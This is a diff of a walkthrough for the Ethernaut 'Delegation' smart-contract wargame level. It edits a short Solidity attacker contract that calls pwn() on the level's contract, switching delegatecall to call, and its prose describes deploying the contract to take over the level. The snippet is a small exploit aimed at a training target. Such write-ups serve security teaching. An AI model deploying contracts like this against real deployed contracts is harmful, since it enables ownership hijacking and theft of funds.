@@ -33,7 +33,7 @@ Let's create a malicious contract with a function that does exactly that. Rather
 ```
 function sendWithData(address $your_ethernaut_address_here) public returns (bool) {
         Delegation delegation = Delegation($your_ethernaut_address_here);
-        (bool success,) = address(delegation).delegatecall(abi.encodeWithSignature("pwn()"));
+        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
         require(success);
     }
 ```
@@ -54,7 +54,6 @@ Make sure the following sentence is fully understood: the function will trigger 
 Yeah, let's reread that a bunch of times because it's a doozy. 
 
 Got it? Good, then we just need to deploy the attacking Delegatoor contract and call our nifty little sendWithData() function to defeat the level.
-
 
 We just hacked the contract!
 
